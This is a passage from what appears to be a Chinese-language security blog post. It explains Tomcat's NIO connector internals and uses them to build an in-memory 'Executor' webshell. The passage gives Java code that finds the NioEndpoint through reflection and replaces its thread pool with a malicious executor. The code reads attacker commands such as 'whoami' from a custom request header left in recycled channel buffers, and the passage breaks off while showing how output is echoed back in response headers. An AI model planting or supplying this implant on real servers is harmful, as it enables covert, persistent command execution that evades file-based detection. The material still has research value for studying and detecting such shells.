（线程池：内部私有 或 共享 &lt;Executor&gt;）→ Executor.execute(...)</span><br><span class="line">  │   └─ Processor (Coyote)    org.apache.coyote.http11.Http11Processor ← 应用层 HTTP/1.1 解析</span><br><span class="line">  │</span><br><span class="line">  └─ Adapter → CoyoteAdapter (Catalina)</span><br><span class="line">        → Pipeline/Valve → Servlet/Filter</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>Connector</strong>：对外的“HTTP 服务器”组件，负责监听端口、接收连接、读写字节流。它不直接跑 Servlet，而是把请求交给内部的容器（Catalina）去处理。</li>
<li><strong>ProtocolHandler</strong>：Connector 的核心实现，负责<strong>传输层</strong>和<strong>应用层协议</strong>两部分。典型实现是 **<code>Http11NioProtocol</code>**（HTTP&#x2F;1.1 + Java NIO）。<ul>
<li><strong>Endpoint（NioEndpoint）</strong>：负责<strong>接收连接、非阻塞轮询与字节读写</strong>；启动时会<strong>创建 Acceptor 与 Poller 线程</strong>。<ul>
<li><strong>Acceptor</strong>：阻塞在 <code>ServerSocketChannel.accept()</code>，接到新连接后调用 <code>setSocketOptions()</code> 并把通道注册给 Poller。线程名通常形如 <code>http-nio-8080-Acceptor-0</code>。</li>
<li><strong>Poller</strong>：Poller 基于 <code>Selector</code> 做<strong>就绪事件轮询</strong>，并<strong>把就绪 Socket 包装为任务（<code>SocketProcessor</code>）投递给线程池</strong>；它自身不做业务解析。</li>
<li><strong>LimitLatch</strong>：<strong>并发连接闸门</strong>。能被“获取”到固定次数，其余请求进入 FIFO 等待，直到有配额归还。用于实现 <code>maxConnections</code> 限制的底层原语之一一。</li>
<li><strong>SocketProcessor（任务）</strong>：从 Poller 交付的 socket 包装成 <code>Runnable</code>，投递到 <strong>Executor</strong>。在 <code>doRun()</code> 中调用协议栈处理。</li>
<li><strong>Executor（线程池）</strong>：真正执行 <code>SocketProcessor</code> 的线程池。未显式配置 <code>&lt;Executor&gt;</code> 时，Connector 会使用<strong>私有内部线程池</strong>；配置了共享 <code>&lt;Executor&gt;</code> 时，以后者为准。</li>
</ul>
</li>
<li><strong>Processor（Http11Processor）</strong>：负责解析请求行&#x2F;首部&#x2F;包体、处理 keep-alive&#x2F;pipeline&#x2F;期望机制等，然后经 <strong>CoyoteAdapter</strong> 进入 Catalina 容器。</li>
</ul>
</li>
<li><strong>Adapter</strong>：把 Coyote（连接器侧）的请求对象转成 Catalina（容器侧）能理解的请求，并把处理结果再适配回去，典型类是 **<code>CoyoteAdapter</code>**。</li>
</ul>
<p>在 Tomcat 中 <code>Executor</code> 由 Service 维护，Service 配了 <code>&lt;Executor&gt;</code> 就让该 Service 下所有 Connector&#x2F;Endpoint 共用这个线程池；没配的话每个 Endpoint 各自新建私有线程池，互不共享。</p>
<p>当 Poller 线程发现某个 socket 就绪，把它打包成任务交给线程池执行，调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.tomcat.util.threads.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1376)</span><br><span class="line">at org.apache.tomcat.util.net.AbstractEndpoint.processSocket(AbstractEndpoint.java:1288)</span><br><span class="line">at org.apache.tomcat.util.net.NioEndpoint$Poller.processKey(NioEndpoint.java:781)</span><br><span class="line">at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:748)</span><br><span class="line">at java.lang.Thread.run(Thread.java:748)</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>AbstractEndpoint#processSocket</code> 把任务要么<strong>直接在当前线程执行</strong>，要么（常见）<strong>派发给线程池</strong>。但是对于 HTTP 请求则会走 派发路径。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ---------------------------------------------- 请求处理方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用给定的状态(event)来处理指定的 SocketWrapper。</span></span><br><span class="line"><span class="comment"> * 常用于“模拟 Poller（对带 Poller 的 Endpoint 而言）已选中该 socket”</span></span><br><span class="line"><span class="comment"> * 的场景，从而触发后续处理。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> socketWrapper 要处理的套接字包装对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> event         要处理的套接字事件（例如 OPEN_READ、OPEN_WRITE 等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> dispatch      是否把处理派发到新的“容器线程”（线程池中的工作线程）。</span></span><br><span class="line"><span class="comment"> *                      为 true 且存在 Executor 时，异步提交到线程池；</span></span><br><span class="line"><span class="comment"> *                      否则在当前线程里同步执行。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 触发处理是否成功（true 表示已成功触发执行，false 表示失败）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">processSocket</span><span class="params">(SocketWrapperBase&lt;S&gt; socketWrapper,</span></span><br><span class="line"><span class="params">                             SocketEvent event, <span class="type">boolean</span> dispatch)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 空检查：没有可处理的 socket，直接返回失败</span></span><br><span class="line">        <span class="keyword">if</span> (socketWrapper == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        SocketProcessorBase&lt;S&gt; sc = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 从处理器缓存（对象池）中尝试取一个可复用的 SocketProcessor</span></span><br><span class="line">        <span class="keyword">if</span> (processorCache != <span class="literal">null</span>) &#123;</span><br><span class="line">            sc = processorCache.pop();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sc == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 3) 缓存里没有可用的处理器，则创建新的处理器并绑定当前 socket 与事件</span></span><br><span class="line">            sc = createSocketProcessor(socketWrapper, event);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 4) 复用旧处理器：重置为当前 socket 与事件，避免重复创建对象</span></span><br><span class="line">            sc.reset(socketWrapper, event);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 获取执行器（线程池）：可能是共享 &lt;Executor&gt; 或 Endpoint 的私有线程池</span></span><br><span class="line">        <span class="type">Executor</span> <span class="variable">executor</span> <span class="operator">=</span> getExecutor();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dispatch &amp;&amp; executor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 6a) 需要派发且有可用线程池：把任务提交给线程池异步执行</span></span><br><span class="line">            executor.execute(sc);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 6b) 否则：在当前线程中直接执行（同步运行）</span></span><br><span class="line">            sc.run();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RejectedExecutionException ree) &#123;</span><br><span class="line">        <span class="comment">// 线程池拒绝执行（如队列已满、线程池已关闭或饱和）：记录警告并返回失败</span></span><br><span class="line">        getLog().warn(sm.getString(<span class="string">&quot;endpoint.executor.fail&quot;</span>, socketWrapper), ree);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        <span class="comment">// 捕获其他严重错误（如 OOM、线程创建失败等），按 Tomcat 约定处理/标注</span></span><br><span class="line">        ExceptionUtils.handleThrowable(t);</span><br><span class="line">        <span class="comment">// 记录错误并返回失败</span></span><br><span class="line">        getLog().error(sm.getString(<span class="string">&quot;endpoint.process.fail&quot;</span>), t);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 若未出现异常，说明已成功触发处理</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的 <code>executor</code> 是 endpoint 自己启动的 <code>ThreadPoolExecutor</code> 类，接着调用了 <code>org.apache.tomcat.util.threads.ThreadPoolExecutor#execute</code>。</p>
<p>因此我们可以创建一个恶意的 Executor 类继承 <code>ThreadPoolExecutor</code>，并重写其中的 <code>execute</code> 方法，然后通过 <code>AbstractEndpoint#setExecutor</code> 将原本的 <code>executor</code> 替换为我们构造的恶意 <code>executor</code>，那么在调用该方法的时候将会执行恶意代码。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * External Executor based thread pool.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">Executor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setExecutor</span><span class="params">(Executor executor)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.executor = executor;</span><br><span class="line">    <span class="built_in">this</span>.internalExecutor = (executor == <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里 <code>AbstractEndpoint</code> 是一个抽象类，通常 Tomcat 中真正实例化的是 <code>org.apache.tomcat.util.net.NioEndpoint</code>，我们可以通过对象搜索找到一条获取 <code>NioEndpoint</code> 对象的路径。</p>
<p>下面是一条可行路径：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thread（名字形如 http-nio-8080-Acceptor）</span><br><span class="line">    └─ target  (Runnable) = Acceptor/AbstractEndpoint$Acceptor</span><br><span class="line">           ├─ endpoint 字段       → 指向 NioEndpoint</span><br><span class="line">           └─ 或 this$0 外部引用 → 同样指向 NioEndpoint（非静态内部类的合成字段）</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>Tomcat 给每个 Connector 起了有规律的线程名（<code>http-nio-&lt;port&gt;-Acceptor</code> &#x2F; <code>Poller</code>）。这些线程的 <code>target</code> 就是 Acceptor&#x2F;Poller 对象；而 Acceptor 是 <code>AbstractEndpoint</code> 的内部类，<strong>持有对外部 Endpoint 的引用</strong>（有的版本字段名就是 <code>endpoint</code>，有的由编译器生成为 <code>this$0</code>），所以顺着这条链就能拿到 <code>NioEndpoint</code>。</p>
</blockquote>
<p>最终我们可以通过下面这段代码注册内存马：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getStandardService</span><span class="params">()</span> &#123;</span><br><span class="line">    Thread[] threads = (Thread[]) <span class="built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">        <span class="keyword">if</span> (thread == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>))) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="built_in">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">nioEndPoint</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                nioEndPoint = getField(target, <span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nioEndPoint == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    nioEndPoint = getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (nioEndPoint == <span class="literal">null</span>)</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">return</span> nioEndPoint;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> nioEndPoint;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">NioEndpoint</span> <span class="variable">nioEndpoint</span> <span class="operator">=</span> (NioEndpoint) getStandardService();</span><br><span class="line"><span class="type">ThreadPoolExecutor</span> <span class="variable">exec</span> <span class="operator">=</span> (ThreadPoolExecutor) getField(nioEndpoint, <span class="string">&quot;executor&quot;</span>);</span><br><span class="line"><span class="type">threadexcutor</span> <span class="variable">exe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">threadexcutor</span>(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());</span><br><span class="line">nioEndpoint.setExecutor(exe);</span><br></pre></td></tr></table></figure></div>

<p>虽然现在我们可以注册 Executor 内存马，但是还是无法解决内存马的通信问题。</p>
<p>这是因为标准的 <code>ServletRequest</code> 需要经过 <code>Adapter</code> 的封装后才可获得，这里还在 <code>Endpoint</code> 阶段，其后面封装的 <code>ServletRequest</code> 和 <code>ServletResponse</code> 是不能直接获取的。因此我们需要寻找底层与请求数据处理相关的结构来实现通信。</p>
<p><code>nioChannels</code> 是 <code>NioEndpoint</code> 里的一个 <strong>对象池（池化缓存）</strong>，类型是 <code>SynchronizedStack&lt;NioChannel&gt;</code>。它只存“<strong>闲置</strong>的 <code>NioChannel</code>”，也就是<strong>已经关闭或暂时不用</strong>的连接包装对象。这样下一次再有新连接进来时，端点优先从池子里 <strong><code>pop()</code> 复用</strong>一个旧的 <code>NioChannel</code>，避免频繁 <code>new</code> 和随之而来的 GC 压力。</p>
<p>其中 <code>stack</code> 成员是 <code>nioChannels</code> 的底层数组，也就是真正存放缓存对象的地方。当一条连接刚刚<strong>关闭并回收到池</strong>时，<code>NioChannel</code> 及其关联对象（<code>NioSocketWrapper</code> → <code>Http11InputBuffer</code> 等）会被<strong>重置</strong>但<strong>不会立刻清零底层字节数组</strong>。因此我们可以获取到里面残留的数据，<strong>从中提取出需要执行的命令</strong>：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NioEndpoint</span><br><span class="line"> └─ nioChannels = SynchronizedStack&lt;NioChannel&gt;   ← 只放“闲置/回收”的连接对象</span><br><span class="line">     └─ NioChannel (Closed)</span><br><span class="line">         ├─ socketWrapper = NioSocketWrapper (Closed)</span><br><span class="line">         └─ appReadBufHandler / Http11InputBuffer</span><br><span class="line">             └─ byteBuffer = HeapByteBuffer[pos=0 lim=0 cap=16384]</span><br><span class="line">                 └─ hb (byte[]) = &quot;GET /aaa ...\r\nconnection: closee\r\n\r\n&quot;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>大多数情况下我们看到 <code>nioChannels</code> 的 <code>stack</code> 数组中的元素都是 <code>null</code>，这是因为 <strong>HTTP&#x2F;1.1 默认长连接（keep-alive）</strong>，连接不会马上关闭，自然不会把 <code>NioChannel</code> 放回对象池，导致对象池是空的。</p>
<p>解决办法是先通过下面这条命令快速发生多个带有 <code>Connection: close</code> 的连接请求，<strong>让“每个请求用完就关闭”，促使 <code>NioChannel</code> 频繁被 push 回池</strong>。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..2&#125;; <span class="keyword">do</span></span><br><span class="line">  curl -s -o /dev/null --http1.1 -H <span class="string">&quot;Connection: close&quot;</span> http://127.0.0.1:8080/aaa &amp;</span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">wait</span></span><br></pre></td></tr></table></figure></div>

<p>这样导致对象池非空，<strong>后续请求也就会复用池中的对象</strong>，从而实现通信。当然这里的复用也不是 100% 就能复用的，一个数据包可能得发几次才能复用（<del>堆风水</del>）。</p>
<p>另外由于 Tomcat 在后续处理数据包的时候由在缓冲区内部做了一些特殊操作，导致数据包中所请求头的最后一个字符会重复一个。实际通信的时候需要忽略这个重复的字符。</p>
<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/aaa</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">host:127.0.0.1:80800</span><br><span class="line">user-agent:curl/7.81.00</span><br><span class="line">accept:*/**</span><br><span class="line">connection:closee</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>最终我们获取请求数据的代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">MY_MESSAGE</span> <span class="operator">=</span> <span class="string">&quot;my-message&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                <span class="keyword">if</span> (threadName.contains(<span class="string">&quot;Acceptor&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            Object[] objects = (Object[]) getField(getField(getField(target, <span class="string">&quot;endpoint&quot;</span>), <span class="string">&quot;nioChannels&quot;</span>), <span class="string">&quot;stack&quot;</span>);</span><br><span class="line">                            <span class="type">ByteBuffer</span> <span class="variable">heapByteBuffer</span> <span class="operator">=</span> (ByteBuffer) getField(getField(objects[<span class="number">0</span>], <span class="string">&quot;appReadBufHandler&quot;</span>), <span class="string">&quot;byteBuffer&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(heapByteBuffer.array(), StandardCharsets.UTF_8);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (data.contains(MY_MESSAGE)) &#123;</span><br><span class="line">                                <span class="keyword">return</span> data.substring(</span><br><span class="line">                                        data.indexOf(MY_MESSAGE) + MY_MESSAGE.length() + <span class="number">1</span>,</span><br><span class="line">                                        data.indexOf(<span class="string">&quot;\r&quot;</span>, data.indexOf(MY_MESSAGE)) - <span class="number">1</span></span><br><span class="line">                                );</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们只需要将通信数据放到请求头的 <code>my-message</code> 对应的值中即可：</p>
<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">my-message</span><span class="punctuation">: </span>whoami</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>回显数据时，Tomcat 的 <code>org.apache.catalina.connector.Response</code>（通过 <code>ResponseFacade</code> 暴露给应用）<strong>实现</strong>了 <code>HttpServletResponse</code> 接口。</p>
<blockquote>
<p>对于HTTP&#x2F;1.1的请求，Tomcat使用一个处理器类叫 <code>Http11Processor</code>。每当它处理一个请求时，都会持有两个基础对象：</p>
<ul>
<li><code>org.apache.coyote.Request</code></li>
<li><code>org.apache.coyote.Response</code></li>
</ul>
<p>但应用程序一般并不会直接操作这两个对象。Tomcat上面还有一层 <strong>Catalina</strong>（即Servlet容器层），你在Servlet代码中经常看到的 <code>HttpServletRequest</code> 和 <code>HttpServletResponse</code> 都是Catalina层提供的对象。具体来说，Catalina真正负责实现HTTP响应功能的是：<code>org.apache.catalina.connector.Response</code>，它实现了接口 <code>HttpServletResponse</code>。</p>
<p>为了防止应用程序随意修改底层实现细节，应用程序实际拿到的是一个外层包装对象：**<code>ResponseFacade</code>**，它也实现了相同接口，但内部调用都会委托给真正干活的 <code>connector.Response</code>。</p>
</blockquote>
<p>由于 <code>Http11Processor</code>（继承自 <code>org.apache.coyote.AbstractProcessor</code>）在处理一次请求时持有 Coyote 层的 <code>Request/Response</code>，因此我们可以在这个阶段搜索到该对象：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Thread（名字形如 http-nio-8080-Acceptor）</span><br><span class="line">  └─ target : AbstractEndpoint$Acceptor / NioEndpoint$Acceptor（Runnable）</span><br><span class="line">      └─ endpoint : NioEndpoint</span><br><span class="line">          └─ handler : AbstractProtocol$ConnectionHandler</span><br><span class="line">              └─ proto : Http11NioProtocol</span><br><span class="line">                  └─ global : RequestGroupInfo</span><br><span class="line">                      └─ processors : List&lt;RequestInfo&gt;   ← 活跃请求清单（进行中的 Processor）</span><br><span class="line">                          └─ req : org.apache.coyote.Request（Coyote）</span><br><span class="line">                              └─ response : org.apache.coyote.Response（Coyote）   ← ★ 已拿到</span><br></pre></td></tr></table></figure></div>

<p>拿到 <code>Response</code> 对象后我们就可以使用 <code>addHeader</code> 方法将要回显的数据添加到响应头中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getResponse</span><span class="params">(String res)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">threadName</span> <span class="operator">=</span> thread.getName();</span><br><span class="line">                <span class="keyword">if</span> (threadName.contains(<span class="string">&quot;Acceptor&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (target <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ArrayList&lt;?&gt; objects = (ArrayList&lt;?&gt;) getField(getField(getField(getField(target, <span class="string">&quot;endpoint&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>), <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                            <span class="keyword">for</span> (Object tmp_object : objects) &#123;</span><br><span class="line">                                <span class="type">RequestInfo</span> <span class="variable">request</span> <span class="operator">=</span> (RequestInfo) tmp_object;</span><br><span class="line">                                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(getField(request, <span class="string">&quot;req&quot;</span>), <span class="string">&quot;response&quot;</span>);</span><br><span class="line">                                